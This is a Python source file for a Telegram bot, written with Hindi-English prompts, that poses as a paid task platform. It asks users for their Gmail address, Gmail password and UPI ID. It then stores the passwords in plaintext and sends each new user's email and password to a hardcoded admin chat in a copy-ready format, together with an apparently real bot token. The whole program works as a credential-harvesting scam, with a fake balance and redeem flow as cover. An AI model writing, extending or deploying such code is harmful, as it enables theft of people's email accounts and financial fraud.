import logging
import sqlite3
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Logging Configuration
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

TOKEN = os.getenv("BOT_TOKEN", "8681941726:AAFll1hp4rZtCHRL_4t-gpgn_frGSZzif5c")
ADMIN_ID = int(os.getenv("ADMIN_ID", "5116589075"))

# --- DATABASE SETUP ---
def init_db():
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            gmail TEXT,
            password TEXT,
            upi TEXT,
            balance REAL DEFAULT 0.0,
            history TEXT DEFAULT 'Account Created Successfully'
        )
    """)
    conn.commit()
    conn.close()

init_db()

def get_user(user_id):
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT username, gmail, password, upi, balance, history FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    if row:
        return {
            "username": row[0],
            "gmail": row[1],
            "pass": row[2],
            "upi": row[3],
            "balance": row[4],
            "history": row[5].split("|||") if row[5] else []
        }
    return None

def get_all_users():
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, username, gmail, balance FROM users")
    rows = cursor.fetchall()
    conn.close()
    return rows

def save_user(user_id, username, gmail, password, upi, balance=0.0, history=None):
    if history is None:
        history = ["Account Created Successfully"]
    history_str = "|||".join(history)
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("""
        INSERT OR REPLACE INTO users (user_id, username, gmail, password, upi, balance, history)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (user_id, username, gmail, password, upi, balance, history_str))
    conn.commit()
    conn.close()

# --- HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    if user:
        await show_main_menu(update, context)
    else:
        await update.message.reply_text(
            "👋 Welcome! Task bot mein register karne ke liye apni **Gmail ID** bhejein:",
            parse_mode="Markdown"
        )
        context.user_data['state'] = 'WAITING_GMAIL'

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "No_Username"
    text = update.message.text
    state = context.user_data.get('state')

    if state == 'WAITING_GMAIL':
        context.user_data['gmail'] = text
        context.user_data['state'] = 'WAITING_PASS'
        await update.message.reply_text("🔑 Ab apna **Password** bhejein:", parse_mode="Markdown")
        
    elif state == 'WAITING_PASS':
        context.user_data['pass'] = text
        context.user_data['state'] = 'WAITING_UPI'
        await update.message.reply_text("💳 Ab apni **UPI ID** bhejein (Jisme redeem milega):", parse_mode="Markdown")
        
    elif state == 'WAITING_UPI':
        upi = text
        gmail = context.user_data.get('gmail')
        password = context.user_data.get('pass')
        
        save_user(user_id, username, gmail, password, upi)
        context.user_data['state'] = None
        
        await update.message.reply_text("✅ **Registration Successful!**", parse_mode="Markdown")
        await show_main_menu(update, context)
        
        # Notify Admin with easy copy format
        try:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=(
                    f"👤 **New User Registered!**\n\n"
                    f"🆔 User ID: `{user_id}`\n"
                    f"🔗 Username: @{username}\n"
                    f"📧 Gmail: `{gmail}`\n"
                    f"🔑 Password: `{password}`\n"
                    f"💳 UPI ID: `{upi}`\n\n"
                    f"💡 *Balance add karne ke liye use karein:*\n`/addrs {user_id} <amount>`"
                ),
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Failed to notify admin: {e}")
            
    # Admin Quick Add Balance via Reply or Text
    elif user_id == ADMIN_ID and text.startswith("/addrs"):
        try:
            parts = text.split()
            target_user = int(parts[1])
            amount = float(parts[2])
            user = get_user(target_user)
            if user:
                new_balance = user["balance"] + amount
                user["history"].append(f"Added Rs.{amount} by Admin")
                save_user(target_user, user["username"], user["gmail"], user["pass"], user["upi"], new_balance, user["history"])
                
                await update.message.reply_text(f"✅ Successfully added Rs.{amount} to user `{target_user}`", parse_mode="Markdown")
                
                try:
                    await context.bot.send_message(
                        chat_id=target_user,
                        text=f"🎉 Aapke account mein Admin dwara **Rs.{amount}** add kar diye gaye hain!",
                        parse_mode="Markdown"
                    )
                except:
                    pass
            else:
                await update.message.reply_text("❌ User ID database mein nahi mili.")
        except Exception:
            await update.message.reply_text("❌ Galat format! Use karein: `/addrs <user_id> <amount>`", parse_mode="Markdown")

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        return
    
    users = get_all_users()
    if not users:
        await update.message.reply_text("📂 Koi bhi user abhi register nahi hai.")
        return
    
    msg = f"📊 **Admin Panel - Total Users: {len(users)}**\n\n"
    for u in users:
        msg += f"👤 ID: `{u[0]}` | @{u[1]}\n📧 {u[2]} | 💰 Rs.{u[3]}\nCommand: `/addrs {u[0]} 10`\n------------------\n"
    
    await update.message.reply_text(msg, parse_mode="Markdown")

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("👤 My Profile", callback_data="profile")],
        [InlineKeyboardButton("📋 Task History", callback_data="history")],
        [InlineKeyboardButton("💸 Redeem Request", callback_data="redeem")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.message.edit_text("📌 **Main Menu:**", reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await update.message.reply_text("📌 **Main Menu:**", reply_markup=reply_markup, parse_mode="Markdown")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data
    user = get_user(user_id)

    if not user and data != "back_home":
        await query.message.reply_text("Pehle /start karein.")
        return

    if data == "profile":
        profile_text = (
            f"👤 **Your Profile**\n\n"
            f"📧 Gmail: `{user['gmail']}`\n"
            f"💳 UPI ID: `{user['upi']}`\n"
            f"💰 Balance: `Rs.{user['balance']}`"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_home")]]
        await query.message.edit_text(profile_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "history":
        history_list = "\n".join([f"• {item}" for item in user['history']]) if user['history'] else "No history yet."
        history_text = f"📋 **Task & Activity History:**\n\n{history_list}"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_home")]]
        await query.message.edit_text(history_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "redeem":
        if user['balance'] <= 0:
            await query.answer("❌ Aapka balance 0 hai, redeem nahi lag sakta!", show_alert=True)
            return
        
        amount = user['balance']
        user['history'].append(f"Redeem requested for Rs.{amount}")
        save_user(user_id, user['username'], user['gmail'], user['pass'], user['upi'], 0.0, user['history'])
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=(
                    f"🚨 **New Redeem Request!**\n\n"
                    f"👤 User ID: `{user_id}`\n"
                    f"🔗 Username: @{user['username']}\n"
                    f"📧 Gmail: `{user['gmail']}`\n"
                    f"💳 UPI: `{user['upi']}`\n"
                    f"💰 Amount: `Rs.{amount}`"
                ),
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Failed to send redeem alert: {e}")

        await query.answer("✅ Aapka redeem request admin ke paas bhej diya gaya hai!", show_alert=True)
        await show_main_menu(update, context)

    elif data == "back_home":
        await show_main_menu(update, context)

def main():
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("admin", admin_panel))  # <--- New Admin Panel Command
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    logger.info("🤖 Professional Bot started successfully...")
    application.run_polling()

if __name__ == "__main__":
    main()
    
